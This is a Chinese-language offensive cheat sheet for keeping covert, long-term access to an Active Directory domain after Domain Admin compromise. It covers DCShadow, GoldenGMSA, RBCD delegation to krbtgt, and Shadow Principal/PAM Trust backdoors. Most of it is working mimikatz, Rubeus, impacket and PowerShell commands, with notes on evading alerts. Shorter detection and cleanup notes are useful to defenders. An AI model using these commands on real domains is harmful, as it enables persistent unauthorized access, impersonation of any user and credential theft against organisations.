# AD 高级持久化技术

DCShadow、GoldenGMSA、krbtgt 委派、Shadow Principals 四种进阶持久化方法。适用于已取得 Domain Admin 后需要建立长期隐蔽访问的场景。

---

## DCShadow

### 原理

注册一台临时域控制器（修改目标机器的 SPN 和 `CN=Configuration` 条目），通过 DRS 复制协议将恶意修改推送到真实 DC，随后注销临时 DC 注册。所有变更均通过合法复制通道完成，不会产生常规 LDAP 修改日志。

### 前置条件

- Domain Admin 权限
- 两个 mimikatz 实例同时运行
  - **RPC shell**: 以 SYSTEM 身份运行，准备变更内容
  - **Trigger shell**: 以 DA 身份运行，触发复制推送

### 命令

```
# RPC shell (SYSTEM) — 准备变更
lsadump::dcshadow /object:$TARGET /attribute:$ATTR /value:$VALUE
```

```
# Trigger shell (DA) — 推送复制
lsadump::dcshadow /push
```

### 可修改内容

| 属性 | 用途 |
|------|------|
| servicePrincipalName | 添加 SPN 用于 Kerberoast 或 Silver Ticket |
| SIDHistory | 注入高权限 SID 实现权限提升 |
| primaryGroupID | 修改主组 (如改为 Domain Admins 512) |
| ntSecurityDescriptor (DACL) | 添加隐蔽 ACE 后门 |
| 任意 AD 属性 | 根据需要修改任何可复制属性 |

### 检测

- DRS 复制来自非 DC 源: **Event ID 4929**
- 监控 `nTDSDSA` 对象的创建和删除
- 检查 SPN 中是否出现 `E3514235-4B06-11D1-AB04-00C04FC2DCD2` (DRS 复制 GUID)

### 注意事项

- 仅限 Windows 环境 (mimikatz 无 UNIX 版本)
- 需要两个独立进程同时运行
- 推送完成后临时 DC 注册会自动清理

---

## GoldenGMSA

### 原理

Group Managed Service Account (gMSA) 的密码由 KDS Root Key 派生计算。KDS Root Key 创建后不会轮转，因此一旦提取该 Key，即可离线计算任意 gMSA 的当前密码——即使 gMSA 密码每 240 小时自动轮转。

### 获取 KDS Root Key (需 Domain Admin)

```bash
# Windows
GoldenGMSA.exe kdsinfo
```

```bash
# UNIX (impacket 扩展)
python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo
```

### 计算 gMSA 密码 (仅需低权限)

获取 KDS Root Key 后，后续利用只需能读取 gMSA 对象的 `msDS-ManagedPasswordId` 属性（默认 Authenticated Users 可读）。

```bash
# 枚举 gMSA 信息
GoldenGMSA.exe gmsainfo
```

```bash
# 计算指定 gMSA 密码 (Windows)
GoldenGMSA.exe compute --sid "$SID" --kdskey "$KEY" --pwdid "$PWDID"
```

```bash
# 计算指定 gMSA 密码 (UNIX)
python3 main.py compute --sid $SID --kdskey "$KEY" --pwdid "$PWDID"
```

### NT Hash 转换

计算结果为 Base64 编码的密码，需转换为 NT hash 用于 Pass-the-Hash:

```python
import hashlib, base64
nt_hash = hashlib.new("md4", base64.b64decode(b64)).hexdigest()
```

### 持久化优势

- KDS Root Key 不会过期或轮转
- 提取一次即可永久计算所有 gMSA 密码
- 后续利用仅需低权限（读取 gMSA 对象）
- gMSA 常用于高权限服务账户

### 检测

- 审计 KDS Root Key 对象的读取 (`CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration`)
- 监控非授权主机请求 gMSA 密码
- 定期轮换 KDS Root Key (需重新创建所有 gMSA)

---

## Delegation to krbtgt

### 原理

对 `krbtgt` 账户设置 Resource-Based Constrained Delegation (RBCD)，使受控计算机账户可通过 S4U2proxy 获取 `krbtgt` 服务的 TGS。由于 `krbtgt` 的 TGS 本质上等同于 TGT，因此可模拟任意用户获取域内任何服务的访问权限。

### 限制

- **Protected Users** 组成员不受影响（不允许委派）
- 标记为 **"Account is sensitive and cannot be delegated"** 的用户不受影响

### 命令 (UNIX)

```bash
# 设置 RBCD: 允许 YOURPC$ 委派到 krbtgt
rbcd.py -delegate-from 'YOURPC$' -delegate-to 'krbtgt' -dc-ip $DC -action write 'DOMAIN/DA:Pass'

# S4U: 模拟目标用户获取 krbtgt TGS (≈ TGT)
getST.py -spn "KRBTGT" -impersonate "TargetUser" -dc-ip $DC 'DOMAIN/YOURPC$:Pass'

# 使用获取的票据访问目标服务
KRB5CCNAME='TargetUser@krbtgt_DOMAIN@DOMAIN.ccache' getST.py -spn 'cifs/target' -k -no-pass 'DOMAIN/TargetUser'
```

### 命令 (Windows)

```powershell
# 设置 RBCD
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount YOURPC$

# S4U: 模拟目标用户
Rubeus.exe s4u /nowrap /impersonateuser:"TargetUser" /msdsspn:"krbtgt" /domain:"DOMAIN" /user:"YOURPC$" /rc4:$HASH

# 使用票据访问服务
Rubeus.exe asktgs /service:"cifs/target" /ticket:"base64ticket" /ptt
```

### 隐蔽性分析

- 不修改 `krbtgt` 密码（与 Golden Ticket 不同）
- 不触发密码重置相关告警
- 常规监控通常不检测 RBCD 配置变更
- `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性存储在 `krbtgt` 对象上

### 检测

- 监控 `krbtgt` 对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性变更
- S4U2self/S4U2proxy 请求目标为 `krbtgt` 的 Kerberos 日志
- Event ID 4742 (计算机账户修改) 关联 RBCD 配置

### 清理

```powershell
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount $null
```

```bash
rbcd.py -delegate-from 'YOURPC$' -delegate-to 'krbtgt' -dc-ip $DC -action remove 'DOMAIN/DA:Pass'
```

---

## Shadow Principals / PAM Trust

### 原理

在 PAM Trust (Privileged Access Management Trust) / Red Forest / Bastion Forest 架构中，Bastion Forest 被攻陷后可在 Production Forest 建立持久化。Shadow Security Principals 映射 Bastion Forest 中的用户到 Production Forest 中的高权限组，攻击者可操纵此映射关系。

### 方法 1: 标记 Shadow Security Principal

将 Production Forest 中的低权限用户标记为 Shadow Security Principal，使其在 Bastion Forest 的 PAM Trust 关系中获得高权限映射。

```powershell
# 枚举现有 Shadow Principal 对象
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$CONFIGURATION_DN" -Filter * -Properties *

# 查看映射关系
Get-ADObject -Filter {objectClass -eq "msDS-ShadowPrincipal"} -SearchBase "CN=Shadow Principal Configuration,CN=Services,$CONFIGURATION_DN" -Properties msDS-ShadowPrincipalSid,member
```

```powershell
# 添加低权限用户到 Shadow Principal 的 member 属性
Set-ADObject "CN=$SHADOW_PRINCIPAL,CN=Shadow Principal Configuration,CN=Services,$CONFIGURATION_DN" -Add @{member="CN=$LOW_PRIV_USER,CN=Users,$DOMAIN_DN"}
```

### 方法 2: 修改 Shadow Principal Object DACL

在 Shadow Principal Object 上添加 Read/Write Members ACE，使受控用户可自行修改成员关系。

```powershell
# 获取 Shadow Principal 对象的 ACL
$acl = Get-Acl "AD:CN=$SHADOW_PRINCIPAL,CN=Shadow Principal Configuration,CN=Services,$CONFIGURATION_DN"

# 添加 Write Members 权限给受控用户
$identity = New-Object System.Security.Principal.NTAccount("$DOMAIN\$CONTROLLED_USER")
$rights = [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty -bor [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
$type = [System.Security.AccessControl.AccessControlType]::Allow
# bf9679c0-0de6-11d0-a285-00aa003049e2 = member 属性的 GUID
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type, [guid]"bf9679c0-0de6-11d0-a285-00aa003049e2")
$acl.AddAccessRule($ace)
Set-Acl -AclObject $acl "AD:CN=$SHADOW_PRINCIPAL,CN=Shadow Principal Configuration,CN=Services,$CONFIGURATION_DN"
```

### 适用场景

| 架构 | 说明 |
|------|------|
| PAM Trust | Windows Server 2016+ 原生 PAM 功能 |
| Red Forest (ESAE) | Enhanced Security Admin Environment |
| Bastion Forest | 通用堡垒森林架构 |

### 前置条件

- 已攻陷 Bastion Forest 的高权限
- Bastion Forest 与 Production Forest 之间存在 PAM Trust 关系
- 对 Shadow Principal Configuration 容器有写权限

### 检测

- 监控 `CN=Shadow Principal Configuration` 容器下对象的修改
- 审计 Shadow Principal 对象的 member 属性变更
- 检测 DACL 变更 (Event ID 5136 / 4662)
- 异常的跨森林认证请求

### 隐蔽性

- PAM Trust 本身就是管理员使用的合法功能
- Shadow Principal 修改不会触发 Production Forest 中的告警
- DACL 后门允许后续低权限利用
